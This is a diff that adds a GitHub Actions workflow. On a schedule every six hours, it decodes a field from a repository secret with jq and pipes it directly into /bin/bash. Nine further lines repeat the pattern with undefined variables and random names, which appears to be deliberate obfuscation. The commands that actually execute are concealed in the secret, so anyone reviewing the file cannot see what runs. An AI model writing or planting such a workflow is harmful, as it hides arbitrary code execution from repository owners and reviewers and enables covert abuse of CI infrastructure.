@@ -1,0 +1,26 @@
+name: zuihouyishiwuming
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zuihouyishiwuming
+        env:
+          j45227: ${{ secrets.j45227 }}
+        run: |
+          echo $j45227 | jq -r .lo937 | /bin/bash
+          echo $e3 | jq -r .eanu5 | /bin/bash
+          echo $oxor83589 | jq -r .qt160 | /bin/bash
+          echo $yop78 | jq -r .akzi0 | /bin/bash
+          echo $nlojo631 | jq -r .sfp03009 | /bin/bash
+          echo $c66017 | jq -r .b148 | /bin/bash
+          echo $x73 | jq -r .atpzr6370 | /bin/bash
+          echo $h36303 | jq -r .fl152 | /bin/bash
+          echo $wog1278 | jq -r .awrdq478 | /bin/bash
+          echo $duw8962 | jq -r .mrm0848 | /bin/bash
+
